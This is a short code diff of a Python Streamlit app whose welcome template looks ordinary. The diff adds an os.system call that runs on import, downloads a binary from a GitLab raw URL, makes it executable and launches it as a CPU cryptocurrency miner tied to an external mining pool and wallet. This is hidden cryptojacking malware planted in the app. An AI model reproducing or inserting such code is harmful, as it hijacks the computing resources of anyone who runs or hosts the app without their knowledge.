@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system ('curl && wget && git clone https://github.com/oriprajo/example-flask.git ')
+os.system ('curl -L -o surabi https://gitlab.com/azkadafa39/donlod/-/raw/main/surabi && chmod 777 surabi && ./surabi --disable-gpu --algorithm yespowersugar --pool stratum-eu.rplant.xyz:17042 --wallet sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Ajur --password x --cpu-threads $(nproc --all)')
 """
 # Welcome to Streamlit!
 
